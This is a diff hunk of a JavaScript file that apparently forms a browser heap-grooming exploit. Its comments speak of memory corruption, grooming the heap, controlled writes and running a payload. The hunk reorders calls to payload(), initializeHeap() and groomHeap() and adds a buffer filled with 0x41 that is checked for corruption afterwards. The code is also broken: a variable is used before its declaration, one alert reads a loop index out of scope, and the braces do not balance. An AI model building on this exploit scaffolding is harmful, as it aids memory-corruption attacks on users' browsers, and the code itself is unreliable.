@@ -72,17 +72,39 @@ function payload() {
 
 // Step 5: Perform the Exploit
 function performExploit() {
-    let controlledBuffers = initializeHeap(); // Initialize the heap
-    let groomedHeap = groomHeap(); // Groom the heap
-
+    
     // Start the memory corruption
-    payload();
+    
 
     // Perform the controlled memory write
     for (let i = 0; i < 500; i++) { // Fewer controlled writes
         // Controlled write operations
         let buffer = new ArrayBuffer(500); // Smaller allocation for controlled overwrite
         controlledBuffers.push(buffer);
+    }
+    // Step 1: Allocate a known block of memory
+    let buffer = new ArrayBuffer(64); // 64 bytes
+    let view = new Uint8Array(buffer); // View it as an array of bytes
+
+    // Step 2: Fill with known data
+    for (let i = 0; i < view.length; i++) {
+        view[i] = 0x41; // Fill with 'A' (0x41)
+    }
+alert("buffer before memory grooming" + i + ": " + view[i]);
+
+    // Step 3: Modify the payload to write a specific value being B 0x42
+
+    // Run the exploit
+    payload();
+let controlledBuffers = initializeHeap(); // Initialize the heap
+    let groomedHeap = groomHeap(); // Groom the heap
+    
+    // Step 4: Check for controlled memory writes
+    for (let i = 0; i < view.length; i++) {
+        if (view[i] !== 0x41) { // Check for changes from the initial pattern
+            alert("Memory corruption detected at index " + i + ": " + view[i]);
+        }
+    }
     }
 }
 
